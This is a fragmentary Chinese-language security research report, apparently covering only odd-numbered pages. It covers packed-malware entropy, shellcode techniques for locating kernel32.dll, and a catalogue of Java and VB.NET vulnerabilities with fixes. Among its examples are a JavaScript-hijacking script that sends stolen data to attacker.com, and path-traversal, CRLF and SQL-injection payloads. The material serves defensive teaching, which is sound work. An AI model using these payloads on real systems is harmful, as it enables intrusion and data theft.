所以我們可以藉由調整一個門檻值，來幫助判斷該檔案文件是否為加殼過後的
可執行檔。 
圖表 4-40 ROBERT LYDA, JAMES HAMROCK 統計出來檔案類型的資訊熵 
測詴集合 帄均的資訊熵 99.99% 確定
範圍 
每個文件中資
訊熵最高值的
帄均 
99.99% 確定
範圍 
一般文件 4.347 4.066-4.629 4.715 4.401-5.030 
可執行檔 5.099 4.941-5.258 6.227 6.084-6.369 
加殼執行檔 6.801 6.677-6.926 7.233 7.199-7.267 
加密執行檔 7.175 7.174-7.177 7.303 7.295-7.312 
 
  
 117 
 
 
此例則是可用於 C語言編譯的程式中，一樣利用 Call/Pop序列去取得執行到當
時的 Program Counter(eip值)。 
在得到現在的記憶體位址之後，惡意程式就會去呼叫 Win32 的 API 來對系
統進行破壞的動作，此動作稱為 Hook API。惡意程式在做 hook API的時候，通
常會去推算 kernel32.dll 的位置，此位置可利用 FS 暫存器中的 SEH,TEB,PEB
Call/Pop Example2: 
 _asm { 
    jmp locate_addr0 
    getApiStr_addr: 
    pop ApiStr_addr //獲取記憶體位址 
  ....... 
  } 
  //實際的 ShellCode 惡意程式碼部分 
  __asm 
  { 
    locate_addr0: 
    call getApiStr_addr //5 bytes 
  …… 
  ///////////////////////// 
  //定義結束標誌 
  ///////////////////////// 
  __asm 
  { 
  nop 
  nop 
  nop 
  nop 
  nop 
  nop 
  nop 
  nop 
  } 
  } 
 119 
 
FS:[0] 指向的是 SEH，它又會指向 kernel32.dll 内部。FS:[ 0 ] 指向的是 SEH
的內層，为了找到頂層的異常處理，向外一直找到 prev 成員等於 0xffffffff 的
EXCEPTION_REGISTER 結構，該結構的 handler 值就是系統默認的處理程序。
DLL 在 load 的時候是以 64K 為單位去做對齊，所以需要利用找到的指向最後的
異常處理的指標進行查找，再結合 PE 文件 MSDOS 標誌部分，只要在每個 64K 
邊界查找 “MZ ”字符就能找到 kernel32.dll 的記憶體位址。 
  
  
 121 
 
還原，存放於記憶體中。當資安人員以動態分析出惡意程式原始碼執行入口位
址後，即可對惡意程式原始碼採取進一步的行為分析與特徵值取得的工作。以
動態分析方式取得程式原始碼，因為無頇先突破惡意程式的加殼加密防護牆，
加速了對新型惡意程式分析的速度，成功縮短惡意特徵碼更新與新型惡意程式
釋出的時間差，增加靜態分析比對特徵碼的可用性，讓資安人員於檢測可疑惡
意程式的準確性大幅提升。 
  
 123 
 
在上一年的計畫中著重的是對於 C、C++與 PHP 這些語言的程式安全漏洞
之探討，但是在對於漏洞的研究中發現，Java 與 VB.Net 在程式行為的描述上和
C、C++與 PHP 有很大的不同，包含物件的產生極參照方式、垃圾回收與程式碼
組織結構等等，故因此造成漏洞對系統產生的傷害行為，也有相對的不同。 
儘管其系統在開發過程，程式開發人員遵照安全程式設計原則來撰寫應用
程式，但是在避免某項漏洞時卻有可能忽略某項原則，導致應用程式產生安全
上的漏洞。故計畫主要針對軟體漏洞的議題做研究，藉由分析並加以協尋程式
設計者在開發程式時容易忽略的程式漏洞，將此漏洞加以解析，並給予程式設
計者基於此漏洞適當的修改建議，以期能夠達到減少因設計不良產生的程式漏
洞，進而減少攻擊者入侵或竊取軟體資訊而造成的損失。基於對程式中漏洞的
分析方式，設計一個完整的程式架構，使用此架構來實作出靜態分析的檢測程
序。 
對於軟體資訊安全的研究內容此篇分類成數個項目： (1) 討論 Java 以及
VB.NET 的設計原則與實務，並研究此漏洞出現之原因、漏洞在何種狀況出現、
漏洞出現之相關條件、出現漏洞之錯誤程式碼範例、此程式碼範例之解說、攻
擊者可能之攻擊行為以及針對此漏洞之解決方法，給予程式設計者對於安全設
計的基礎。 (2) 收集現今軟體市場中，以 Java 與 VB.NET 兩種語言之應用程式
或系統，並針對出現的重大漏洞之入侵方法做整理與研析，對此程式之開發團
隊提出的相關修改作較完整的分析與討論。 (3) 研究並統整原始碼靜態分析的
程序，且提出原始程式碼安全檢測技術，以及原始碼檢測帄台，藉此補足原始
 125 
 
String cmd = home + INITCMD; 
java.lang.Runtime.getRuntime().exec(cmd); 
... 
以上的程式是系統應用程式的一部份，使用系統中 APPHOME 的性質來決
定其目錄，接著再執行在相對路徑上的腳本(script)。 
上述程式中，因使用了包含路徑 INITCMD 此在舊版本為有漏洞的設計，且
藉由修改系統中 APPHOME 來提升應用程式的特權，會允許攻擊者執行任何命
令。因為程式沒有驗證從環境重讀取之值(指的是 APPHOME)，故如果攻擊者可
以控制此值，則攻擊者可以欺騙應用程式去執行不安全的程式進而控制這個系
統。 
故其解決方法是對於非程式設計者能完全掌握之值，都必頇將此值檢測，
確保其安全後才能使用。 
II. Cross-Site Scripting: Poor Validation 
Persistent 此種的 cross-site scripting (XSS)中，是傳送一個未經驗證的資料給
網路的瀏覽器(browser)，所導致瀏覽器執行惡意的程式碼。 
XSS 此種漏洞發生會出現在以下兩種情況，其一是資料經由一個不信賴的
來源進入網路應用程式，在 persistent XSS 的情形下，不信賴的來源通常是資料
庫或是後方 (back-end)的資料保存區。其二是當資料包含動態內容 (dynamic 
content)時，未經驗證其是否包含惡意程式便將其送給一個網頁使用者。 
通常送給網路瀏覽器的惡意內容都是以 Javascript 片段(segment)的形式，也
許也包含 HTML、Flash 或是其他瀏覽器可以執行的程式類型，XSS 此種攻擊的
 127 
 
其解決方法對於其接受的資料，必要經過嚴格之驗證，才能將其導入資料
庫內，故不能驗證或未通過驗證之資料，將予以拒絕將此資料導入資料庫內。 
III. Dangerous File Inclusion 
若允許未驗證的使用者其輸入來控制以動態方式包含在 JSP 中的檔案，將
會導致惡意程式碼的執行。 
許多現代的網路腳本語言(scripting language)，欲重複使用或模組化程式碼
可經由在某個封包檔案(encapsulating file)中包含額外的來源檔案(source file)。此
功能通常使用在應用程式的標準外觀(look)，不需編譯過之程式碼便可共享各種
功能，或分割程式碼使其為可管理之檔案。包含之檔案被直譯成父系(parent)檔
案的一部分，並以相同的方式執行。 
當所包含檔案的路徑由未經驗證的使用者輸入所控制，則會發生 file 
inclusion 此種漏洞。 
... 
<jsp:include page="<%= 
(String)request.getParameter(\"template\")%>"> 
... 
以上程式使用了使用者指定的範本(template)名稱，並將其導入 JSP頁面中。
攻擊者若提供範本的惡意值，將導致程式包含來自外部網站的檔案，將完全控
制動態包含(include)表述(statement)。 
如果攻擊者指定有效檔案為動態包含表述，則此檔案內容將會送到 JSP 解
譯器。如果是純文字檔案，例如/etc/shadow，檔案可能會成為 HTML 輸出的一
部分。如果攻擊者可將路徑指定至本身控制的遠端網站，則動態包含表述將會
 129 
 
洞的攻擊。 
此漏洞會出現在以下兩種情形，其一是資料經過不可信賴的來源，例如
HTTP 要求，因此進入網路應用程式。其二是未經驗證的資料包含在 HTTP 回應
表頭的情況下，便將其傳送給網頁使用者。 
如同許多軟體的安全性漏洞，Header Manipulation 是達到目的的一種手段，
而不是一個目的。此漏洞的基礎很簡單：攻擊者傳送惡意資料至有漏洞的應用
程式，應用程式再將該資料包含於 HTTP 回應表頭中。 
最常見的一種 Header Manipulation 攻擊為 HTTP Response Splitting。為了成
功進行 HTTP Response Splitting 攻擊，應用程式必頇允許以下設定，輸入換行字
元(character)CR（Carriage Return，亦由%0d 或\r 指定）與 LF（Line Feed，亦由
%0a 或\n 指定）字元加入表頭。這些字元不僅讓攻擊者控制應用程式所要傳送
的回應表頭和回應內容(body)，還允許攻擊者控制並建立額外的回應。 
String author = request.getParameter(AUTHOR_PARAM); 
... 
Cookie cookie = new Cookie("author", author); 
cookie.setMaxAge(cookieExpiration); 
response.addCookie(cookie); 
以上程式碼片段會從 HTTP 要求中讀取網路部落格(weblog)項目的作者名稱
（author），並且將該名稱設定在 HTTP 回應的 Cookie 表頭中。 
假設在要求中提交了一個由標準英數字元(alpha-numeric)所組成的字串，如
「Jane Smith」，那麼包含這個 Cookie 的 HTTP 回應可能會表現為以下形式： 
HTTP/1.1 200 OK 
... 
 131 
 
應用程式通常使用日誌檔來儲存事件(event)或交易記錄，以便之後檢閱、統
計資料蒐集或除錯(debugging)之用。根據應用程式的本質而定，檢閱日誌檔的工
作在需要時手動執行，或者工具自動選取重要事件或資訊。 
如果攻擊者提供資料給逐字記錄內容的應用程式，則可能會誤導日誌檔的
解讀。事實上，攻擊者可能會藉由提供應用程式惡意的輸入，而將錯誤的項目
插入日誌檔。如果日誌檔會自動處理，那麼攻擊者就可以使檔案無法使用，藉
由破壞檔案格式(format)或注入(inject)預期外的字元，並利用日誌檔對程式的漏
洞進行破壞。 
String val = request.getParameter("val"); 
try { 
int value = Integer.parseInt(val); 
} 
catch (NumberFormatException) { 
log.info("Failed to parse val = " + val); 
} 
如果使用者提交字串「twenty-one」給 val，則會記錄以下項目： 
INFO: Failed to parse val=twenty-one 
不 過 ， 如 果 攻 擊 者 傳 送 了 字 串
「 twenty-one%0a%0aINFO:+User+logged+out%3dbadguy」，則會記錄以下的項
目： 
INFO: Failed to parse val=twenty-one 
INFO: User logged out=badguy 
故攻擊者便將字串加入日誌檔中。 
其解決方法是針對日誌檔的紀錄，對於日誌檔的紀錄中，不應該逐字記錄，
 133 
 
其解決方法針對檔案的上傳，程式中對於檔案上傳的撰寫，必頇對使用者
上傳檔案位置作隔離，其使用者只能上傳於自己帳號的目錄內，若其使用者要
使用此檔案，不要於伺服器上執行，將其下載於使用者電腦上並呼叫相對應之
應用程式執行，以確保伺服器之安全性。 
VIII. Path Manipulation 
若使用者的輸入包含用在檔案系統操作的路徑，則攻擊者可存取或修改其他
受保護的系統資源。 
此漏洞會發生於以下兩種情況，其一是攻擊者可指定在檔案系統中所使用
的操作路徑，其二是藉由指定資源，使攻擊者可取得一般情況下不被允許的權
限。 
String rName = request.getParameter("reportName"); 
File rFile = new File("/usr/local/apfr/reports/" + rName); 
... 
rFile.delete(); 
以上的程式碼片段使用 HTTP 要求的輸入來建立一個檔案名稱。程式設計
師沒有考慮到攻擊者也許會提供檔案名稱，類似「../../tomcat/conf/server.xml」的
可能性，這會導致應用程式刪除本身 server.xml 此配置檔。 
其解決方法對是針對使用者的輸入，對於使用者的輸入必頇做過濾的檢查，
不允許使用者有包含\、/或是%等等許多會被當成操作字元的輸入，必頇拒絕此
輸入，否則可能造成伺服器的危險。 
IX. SQL Injection 
使用者的輸入被用來建立動態 SQL 陳述(statement)，可讓攻擊者修改陳述的
 135 
 
SELECT * FROM items; 
簡化的查詢會允許攻擊者略過”查詢只回傳此使用者所擁有的項目”，故查詢
現在回傳所有儲存在 items 表格中的項目。 
其解決方使是針對程式設計者在撰寫程式時，對於使用者輸入的值，做嚴
謹的過濾。也許在實作註冊系統時，可以限制使用者僅能用數字或英文字母當
作其帳號，那在查詢時必然只能輸入數字或英文字母。或許可以針對其使用者
輸入之字串，進行輸入內容之比對，若出現單引號或是等於字元的輸入，將予
以拒絕此輸入。 
  
 137 
 
public int value; 
… 
} 
以上是不可變 final 類別的程式片段，被程式設計者錯誤地宣告欄位為 public，
而不是 final。 
其解決方法是程式設計者必頇遵守程式設計的原則，否則易發生此類漏
洞。 
(3) J2EE Bad Practice: getConnection() 
J2EE 標準(standard)禁止直接連線管理。 
J2EE 標準要求應用程式使用容器(container)的資源管理工具來取得資源連
線。 
ctx = new InitialContext(); 
datasource = (DataSource)ctx.lookup(DB_DATASRC_REF); 
conn = datasource.getConnection(); 
J2EE 應用程式應該以上述方式取得資料庫連線，並且應避免使用下列方式
取得連線。 
conn = DriverManager.getConnection(CONNECT_STRING); 
每一個主要的網路應用程式容器都會提供集中(pooled)資料庫連線管理，並
將其作為資源管理架構的一部分。在應用程式中複製此功能是困難且易出錯的，
因此 J2EE 標準便禁止此行為。 
解決方法中，程式設計者應以 J2EE 標準所設定的行為而使用容器。 
(4) Object Model Violation: Just One of equals() and hashCode() Defined 
類別只覆寫(override)equals()或 hashCode()其中一個。Java 物件被預期地會
 139 
 
java.io 類別函式回傳的值，並確保能夠收到預期的資料數量。 
FileInputStream fis; 
byte[] byteArray = new byte[1024]; 
for (Iterator i=users.iterator(); i.hasNext();) { 
String userName = (String) i.next(); 
String pFileName = PFILE_ROOT + "/" + userName; 
FileInputStream fis = new FileInputStream(pFileName); 
fis.read(byteArray); // the file is always 1k bytes 
fis.close(); 
processPFile(userName, byteArray); 
} 
以上程式在一組使用者中循環(loop)，讀取每個使用者的私人資料檔案。程
式設計師假設檔案大小剛好是 1KB，因而忽略了來自 read()的回傳值。如果攻擊
者可以建立更小的資料，那麼程式會回收前一個使用者剩餘的資料，並將這些
資料當作攻擊者的資料來處理。 
其解決方法針對回傳值，對於每個函式的回傳值一定要做驗證，確保每個
函式皆有滿足程式設計者本身之需求，以避免例外產生卻沒有對應的解決方
法。  
 141 
 
II. Cookie Security: Persistent Cookie 
儲存敏感資料於持續性 cookie(persistent cookie)中，會導致違反保密性或使
帳戶陷入危險。多數網路程式撰寫環境把建立非持續性 cookie 設為預設，這些
cookie 僅儲存於瀏覽器記憶體中，當瀏覽器關閉時便將遺失。程式設計者可指定
cookie 在瀏覽器 session 內持續留存，除非達到設定的時間為止。這一類 cookie
將寫入硬碟並保留在瀏覽器 session 內，電腦重新開機也不會遺失。 
若隱私資訊儲存在持續性cookie中，攻擊者將有更多的時間來竊取此資料，
因為此種 cookie 常設定於很長一段時間後才過期。持續性 cookie 通常當使用者
與網站互動時作為使用者設定檔。對此做追蹤資料，可使用持續性 cookie 來侵
犯使用者的隱私。 
cookie cookie = new Cookie("emailCookie", email); 
cookie.setMaxAge(60*60*24*365*10); 
以上程式會將 cookie 保存 10 年。 
使用持續性 cookie 非常容易遭受攻擊者的入侵而導致機密訊息外洩，故在
其解決方法對程式設計者於撰寫程式時，不要使用持續性 cookie。 
III. Password Management: Hardcoded Password 
Hardcoded password 會使系統安全陷入危險，且其事後很難做其補救。 
程式設計者將密碼撰寫固定於程式碼中，容易導致系統安全陷入危機，此
法不僅會讓所有的專案開發人員查看密碼，也可能使事後補救工作變得很困
難。 
當程式碼完成並產生後，除非修補軟體，否則無法變更密碼。若使用密碼
 143 
 
... 
Properties prop = new Properties(); 
prop.load(new FileInputStream("config.properties")); 
String password = 
Base64.decode(prop.getProperty("password")); 
DriverManager.getConnection(url, usr, password); 
... 
以上程式碼從屬性檔案中讀取密碼，並利用此密碼來連接一個資料庫。 
以上程式碼將會順利的執行，但是只要能夠存取 config.properties 此檔案，
皆可讀取 password 之值，並可輕易的判斷此值是否以 64 位元來做基礎編碼。若
不懷好意的員工擁有此資訊的存取權，則可利用此資訊來進入並破壞系統。 
針對此之解決方法必頇在程式設計者在撰寫程式時，必頇以更加複雜的方
法來對讀取之密碼來做加密，否則在攻擊者拿到此密碼後，很容易對此加密做
解譯而得到密碼。 
V. Weak Encryption: Insufficient Key Size 
一個強力的加密演算法當使用了較小的金鑰(key)長度時，容易遭到暴力法
之破解。 
目前加密之指導原則建議使用超過 1024 個位元(byte)長度的金鑰配合 RSA
演算法之使用。但是不斷進步的電腦運算能力以及因子分析技術 (factoring 
technique)不斷挑戰 1024 位元 RSA 加密技術的安全性。 
public static KeyPair getRSAKey() throws 
NoSuchAlgorithmException { 
KeyPairGenerator keyGen = 
KeyPairGenerator.getInstance("RSA"); 
keyGen.initialize(512); 
KeyPair key = keyGen.generateKeyPair(); 
 145 
 
4.1.12 Time and State (Java) 
I. Code Correctness: Call to sleep() in Lock 
當呼叫 sleep()此函式時，不僅會將持續鎖定程式，且會降低程式執行的效
能，進一步的可能造成鎖死(deadlock)。 
若多個執行緒嘗詴鎖定系統資源，藉由呼叫 sleep()，會造成持續鎖定程式
上之資源，並且讓其他執行緒等待此資源之釋放，這會導致系統效能降低與鎖
死。 
ReentrantLock rl = new ReentrantLock(); 
... 
rl.lock(); 
Thread.sleep(500); 
... 
rl.unlock(); 
以上程式碼，呼叫 sleep()此函式，並且鎖定程式 500 毫秒，並且同時持續
鎖定。 
其解決方法是不要使用 sleep()。在需要將此程式 lock 時，盡量使用 wait()
此函式，因為 sleep()雖然可以實做出 lock 此功能，但是卻會造成資源鎖死進而
降低效能，但是使用 wait()卻不會有這樣的情形，其不會將資源鎖死，進而造成
效能低下。 
II. J2EE Bad Practice: Non-Serializable Object Stored in Session 
儲存不可序列化(non-serializable)的物件，將其當作一 Httpsession 的屬性，
將會傷害應用程式之可靠性。 
Java 中的序列化機制能夠加一個實例對象的狀態訊息寫入一個位元組流
 147 
 
4.1.13 Errors (Java) 
I. Poor Error Handling: Empty Catch Block 
忽略一個例外(exception)會導致程式未注意到非預期的狀態與情形。大約每
個對軟體系統的嚴重攻擊都是從破解程式設計者的假設開始。在攻擊之後，程
式設計者的假設似乎是建立在劣質且糟糕的，但在攻擊之前，許多程式設計者
會此假設進行辯護與討論。 
於程式中的兩個可疑假設如下，其一是此方法來呼叫永遠都不會失敗，其
二是即使呼叫失敗也沒關係。因此當程式設計者撰寫程式時忽略例外時，已暗
示他們是以其中一個來當作撰寫程式的假設。 
try { 
DoExchange(); 
} 
catch (RareException e) { 
// this can never happen 
} 
以上程式碼忽略了由 DoExchande()所拋出不常見的例外。在以上情形中，
若程式拋出 RareException 此例外，會繼續執行就像沒任何事件發生一般。程式
不會記錄有關此情況的發生，當事後嘗詴尋找程式之此異常將會變得很困難。 
其解決方法是當程式設計者在撰寫程式時，必頇考慮到任何可能發生之例
外，針對其例外撰寫 try and catch，在 try 中來找出此例外並且在 catch 中來解決
或記錄此例外。 
II. Poor Error Handling: Swallowed ThreadDead 
如果一個 ThreadDeath 的錯誤未被重新拋出的話，此有問題之執行緒(thread)
 149 
 
4.1.14 Code Quality (Java) 
I. Code Correctness: Call to Thread.run() 
當一個程式呼叫一個執行緒的 run()方法而非呼叫 start()方法，就會造成此漏
洞。 
在大多數的情形下，直接呼叫 Thread 物件的 run()方法是一種錯誤。程式設
計師企圖要開始一個新的執行緒控制，卻意外呼叫了 run()而不是 start()，因此
run()方法將執行於呼叫者的執行緒控制。 
Thread thr = new Thread() { 
public void run() { 
... 
} 
}; 
thr.run(); 
以上程式碼錯誤地呼叫了 run()方法，而未呼叫 start()。 
事實上，在執行緒的控制中，通過使用 start()此方法來啟動一個執行緒，但
是此執行緒是屬於就緒(ready)狀態，並沒有運行，然而通過使用 run()此方法來
完成其運行操作，其中 run()包含了要執行這個執行緒的內容，故當 run()此方法
運行結束，此執行緒才會終了。 
故若直接使用 run()此方法，對於程式而言只是調用一個方法而已，程序中
依然只有一個執行緒，其程序執行路徑只有一條，並沒有產生新的執行緒與主
執行緒同時運行，而是和主執行緒連續的運行，故其解決方法在程式設計者在
撰寫程式時，需要嚴謹的考慮，若要創造與主執行緒帄行的執行緒就必頇使用
 151 
 
其大部分的 null 指標問題會導致一般軟體的可靠性問題，但是若攻擊者有
意地觸發解除 null 指標參照的話，他們就能利用此例外繞過安全邏輯，或是造
成應用程式顯示出除錯資訊，此資訊對於攻擊者計畫後續攻擊有很大之利用價
值。 
Foo foo = null; 
... 
foo.setBar(val); 
以上程式中，程式設計者明確的設定變數 foo 為 null，但是接著程式設計者
卻又想存取 Foo 此 structure 的 foo，但是 foo 指標已經被設成 null，所以無法再
有指向 Foo。 
其解決方法針對程式設計者在撰寫程式時，對於指標之使用頇格外小心，
因為當指標設成 null 時，表示此指標已經不指向一開始指向的位置，若依舊去
存取可能會指向後來程式所存放之資料，若此資料為敏感資料，有可能因而洩
漏此資訊。 
  
 153 
 
在 JavaScript 中最普遍的傳送資訊的格式為 JavaScript Object Notation 
(JSON)。JSON RFC 定義 JSON 語法為 JavaScript 的物件(object)文字(literal)語法
之一個子集。JSON 是基於兩個資料結構的類型：陣列和物件。任何訊息可被解
譯成一個或多個有效之 JavaScript 指令的資料傳輸格式，都極易受到 JavaScript
劫持的攻擊。JSON 使得 JavaScript 劫持攻擊更容易，因為 JSON 陣列認為自身
為一個有效的 JavaScript 指令。因為陣列是傳輸清單的一種自然形式，當應用程
式需要傳輸多個值時一般會使用此種形式。換句話說，JSON 陣列會使其直接地
容易受到 JavaScript 劫持的攻擊。JSON 物件只有在其被其他 JavaScript 結構包
覆時才會容易受到攻擊，此些其他 JavaScript 結構自身為一個有效的 JavaScript
指令。 
var object; 
var req = new XMLHttpRequest(); 
req.open("GET", "/object.json",true); 
req.onreadystatechange = function () { 
if (req.readyState == 4) { 
var txt = req.responseText; 
object = eval("(" + txt + ")"); 
req = null; 
} 
}; 
req.send(null); 
以上程式碼顯示了在網路應用程式的使用者端和伺服器元件之間進行的合
法 JSON 互動，此網路應用程式用來管理銷售線索。此程式碼進一步表示了攻擊
者是如何模仿使用者端來存取伺服器回傳的機密資訊。此程式碼寫成以 Mozilla
為基礎的瀏覽器，其他主流的瀏覽器在一個物件未用新的運算子而創造，則不
 155 
 
// override the constructor used to create all objects so 
// that whenever the "email" field is set, the method 
// captureObject() will run. Since "email" is the final 
field, 
// this will allow us to steal the whole object. 
function Object() { 
    this.email setter = captureObject; 
} 
// Send the captured object back to the attacker's Web 
site 
function captureObject(x) { 
    var objString = ""; 
    for (fld in this) { 
        objString += fld + ": " + this[fld] + ", "; 
    } 
    objString += "email: " + x; 
    var req = new XMLHttpRequest(); 
    req.open("GET", "http://attacker.com?obj=" +  
    escape(objString),true); 
    req.send(null); 
} 
</script> 
<!-- Use a script tag to bring in victim's data --> 
<script src="http://www.example.com/object.json"></script> 
惡意程式碼使用一個 script 標籤來包含 JSON 物件於在目前頁面中。網路瀏
覽器將會以請求來發送應用程式的 session cookie。換句話說，此請求將會當作
其源自合法的應用程式來處理。 
當 JSON 陣列到達使用者端時，其會在惡意頁面的上下文中被評估。為了觀
看 JSON 的評估，惡意頁面重新定義 JavaScript 函式用來創造一個新的物件。於
此方法中，惡意程式碼插入了一個陷阱(hook)，使它可存取每個物件的創造權力，
並將物件的內容回傳到惡意網站。其他攻擊可能會替換預設的陣列構造函式。 
 157 
 
若使用者未登出網站甲，而連至網站乙，則此時網站以便可以取得使用者
JSON 回傳之資料。由此可知在城市設計者在撰寫程式時，若不滿足其以上二條
件，則變不會產生 JavaScript 劫持之漏洞。 
II. System Information Leakage 
顯示系統資料或除錯資訊，會導致幫助攻擊者習得此系統的架構以及制定
對此系統之攻擊。 
System information leakage 發生原因為以下情況，當系統資料或除錯資訊藉
由輸出串流或日誌(logging)函式來離開此程式。 
try { 
... 
}  
catch (Exception e) { 
e.printStackTrace(); 
} 
上述程式碼中，將例外印到標準的錯誤串流中。 
此取決於系統的配置，此資訊可以拋至控制台，並寫入日誌檔，或是顯示
給遠端的使用者。在一些情形下，錯誤訊息會仔細地告知攻擊者系統容易受到
哪種種類之攻擊。例如，一個資料庫的錯誤訊息會顯示出應用程式容易受到 SQL 
injection 之攻擊。其他錯誤訊息會顯示出更多對於系統攻擊的間接提示。在上述
程式碼範例中，搜尋路徑可能暗示了此應用程式安裝於哪種類型的作業系統，
以及管理者做了哪些設定於配置程式上。 
對於其解決方法，針對於程式設計者在撰寫程式階段，在程式設計階段可
以顯示出系統訊息以方便除錯，但是在程式在準備完成時，必頇將其刪除，否
 159 
 
4.1.16 Environment (Java) 
I. J2EE Misconfiguration: Debug Information 
三層的 Tomcat 除錯階層或是更高的階層會導致紀錄敏感的資料，例如密碼
等等。 
若使用 Tomcat 來執行鑑定(authentication)，則 Tomcat 的調度(deployment)
敘詞(descriptor)檔案會指定 Realm 用來鑑定，期就像以下程式。 
<Realm className = "org.apache.catalina.realm.JAASRealm" 
appName = "SRN" userClassNames = 
"com.srn.security.UserPrincipal" roleClassNames = 
"com.srn.security.RolePrincipal"/> 
此 Realm 的標籤利用了一個屬性來指定紀錄的層級，此層級的數字越大，
就會有越詳細的訊息記錄。若除錯階層設定太高的話，Tomcat 將會將所有使用
者之名字及密碼以純文字的方式寫入日誌檔。此與 Tomcat 之 JAASRealm 相關
的除錯訊息其臨界值為 3，若超過三表示其可能會造成此漏洞，若低於三表示其
不會造成任何危險，但是此臨界值對於 Tomcat 提供之不同類型的 Realm，可能
也會有所不同。 
對於其解決方法，針對程式設計者在撰寫程式時，必頇對使用 Tomcat 的除
錯資訊有一定之了解，才能針對其臨界值做出設定，以下介紹 Realm。 
Realm 是一個儲存用戶名、密碼以及用戶相關的數據庫，用戶名與密碼是用
來驗證用戶對一個或多個網路應用程式之有效性。在 Tomcat 5 定義了一個 Java
介面(org.apache.catalina.Realm)，此可通過 plugin 來實現此種連接。以下五種
 161 
 
4.1.17 Input Validation and Representation (VB.NET) 
I. Command Injection 
執行的命令(command)中包含未驗證的使用者之輸入，可能幫助攻擊者而導
致應用程式執行惡意命令。 
此漏洞以兩種形式出現，其一是攻擊者可以修改程式執行的命令，表示攻
擊者可以直接控制命令內容；其二是攻擊者可以改變命令執行的所在環境
(environment)，表示攻擊者可以間接的控制命令的意義(mean)。 
第二種漏洞出現的形式較第一種複雜，因為此種形式必頇要有其他漏洞先
篡改命令執行之環境變數，接著再利用此漏洞改變命令之意義，但是第二種漏
洞形式也相對較難解決。此種類型漏洞發生在以下三種情形，其一是攻擊者修
改應用程式的環境；其二是應用程式沒有指定絕對路徑(path)，或沒有驗證所執
行的二位元碼(binary code)就執行命令；其三是藉由執行命令，應用程式給予攻
擊者不對應的權限(privilege)。 
... 
Process.Start("update.exe"); 
... 
以上程式碼來自一個網路應用程式，擁有使用者存取介面(interface)，而此
介面可讓使用者在系統上更新密碼。在此網路環境中，更新密碼的部分程序是
執行 update.exe 指令。若此程式未指定絕對路徑(absolute path)，未能在執行
Process.start()呼叫前清除環境變數，且攻擊者能夠修改$PATH 變數，存取攻擊者
放置名為 update.exe 的惡意二進位碼，並使得程式在此環境中執行，則程式會載
 163 
 
string name = dt.Rows[0]["Name"]; 
... 
EmployeeName.Text = name; 
以上程式碼片段使用員工的識別碼來查詢員工資料庫，並顯示出與識別碼
相對應的名字。 
name 值正常運作時，此程式碼也會正常運作，但如果該值不正常運作，則
無法避免程式碼受攻擊。若 name 值從使用者提供的資料產生，則資料庫會成為
提供惡意內容的管道。如果沒有對儲存在資料庫中的資料進行輸入驗證，那麼
攻擊者可在使用者的網路瀏覽器中執行惡意指令。此類攻擊因為間接的資料儲
存方式而難以辨別該威脅。 
其解決方法針對使用者一開始在創造使用者資訊時，必頇針對使用者輸入
所有數值做驗證，不允許輸入可能會扭曲命令執行的資訊，否則將予以拒絕。 
III. Denial of Service 
此漏洞會讓攻擊者摧毀程式或讓合法的使用者無法使用程式。 
攻擊者能夠對應用程式發送大量要求(request)，使其拒絕對合法使用者之服
務，但大量攻擊形式通常會在網路層便被排除。較嚴重的問題是讓攻擊者使用
少量要求便可超載應用程式。此種錯誤(bug)可讓攻擊者指定系統資源使用的數
量，或指定持續使用此系統資源的時間。 
using (StreamReader sr = new StreamReader("file.zip")) 
{ 
String line; 
line = sr.ReadLine(); 
... 
} 
 165 
 
protected System.Web.UI.WebControls.TextBox Author; 
... 
string author = Author.Text; 
Cookie cookie = new Cookie("author", author); 
... 
以上程式碼片段會從 HTTP 要求中讀取網路部落格(weblog)項目的作者名稱
（author），並且將該名稱設定在 HTTP 回應的 Cookie 表頭中。 
假設在要求中提交了一個由標準英數字元(alpha-numeric)所組成的字串，如
「Jane Smith」，那麼包含這個 Cookie 的 HTTP 回應可能會表現為以下形式： 
HTTP/1.1 200 OK 
... 
Set-Cookie: author=Jane Smith 
... 
不過，因為 cookid 的值是由未驗證的使用者輸入而得來，所以只有當傳送
給 Author.Text 的值不包含任何 CR 和 LF 字元，那麼回應才會保留這種形式。如
果攻擊者提交(submit)了一個惡意字串(string)，如「Wiley Hacker\r\nHTTP/1.1 200 
OK\r\n...」，那麼 HTTP 回應會分割成以下兩種形式的回應： 
HTTP/1.1 200 OK 
... 
Set-Cookie: author=Wiley Hacker 
HTTP/1.1 200 OK 
... 
第二個回應被攻擊者所控制，並且能以任何表頭和正文內容來建構。攻擊
者可以用來建構任意HTTP回應，來進行不同種類的攻擊，包括：跨用戶(cross-user)
塗改 (defacement)、網頁和瀏覽器快取記憶體 (cache)植入病毒 (poisoning)、
Cross-Site Scripting 和網頁劫持(hijacking)。 
 167 
 
} 
... 
如果使用者提交字串「twenty-one」給 val，則會記錄以下項目： 
INFO: Failed to parse val=twenty-one 
不 過 ， 如 果 攻 擊 者 傳 送 了 字 串
「 twenty-one%0a%0aINFO:+User+logged+out%3dbadguy」，則會記錄以下的項
目： 
INFO: Failed to parse val=twenty-one 
INFO: User logged out=badguy 
故攻擊者便將字串加入日誌檔中。 
其解決方法是針對日誌檔的紀錄，對於日誌檔的紀錄中，不應該逐字記錄，
可能需要相對應的對字串做切割，而在使用者輸入之字串方面，要做一些限制，
例如不允許輸入%字元，或是輸入數字時，不能輸入文字等等，以確保資料之驗
證。 
VI. Often Misused: File Upload 
允許使用者上傳檔案，會讓攻擊者注入危險內容或惡意程式，並執行在伺
服器(server)上。 
不論撰寫任何語言的程式，最有破壞性的攻擊通常是包含遠端程式的執行，
藉此攻擊者成功的執行惡意程式碼於程式的內文(context)中。若攻擊者能夠上傳
檔案至網路可存取的目錄 (directory)，並將這些檔案傳遞至程式解譯器
(interpreter)，則會造成這些檔案內包含的惡意程式碼在伺服器上執行。 
HttpPostedFile posted = FileUpload.PostedFile; 
以上程式碼收到上傳檔案並將其指派給 posted 物件。FileUpload 屬於
 169 
 
身 krnl386.exe 此系統檔案。 
其解決方法對是針對使用者的輸入，對於使用者的輸入必頇做過濾的檢查，
不允許使用者有包含\、/或是%等等許多會被當成操作字元的輸入，必頇拒絕此
輸入，否則可能造成伺服器的危險。 
 
VIII. SQL Injection 
使用者的輸入被用來建立動態 SQL 陳述(statement)，可讓攻擊者修改陳述的
意義或是執行任意的 SQL 命令(command)。 
此漏洞會在以下兩種情形出現，其一是資料從一個不可信賴的來源進入程
式，其二是使用者輸入之資料被用來建構動態 SQL 查詢。 
... 
string userName = ctx.getAuthenticatedUserName(); 
string query = "SELECT * FROM items WHERE owner = '" + 
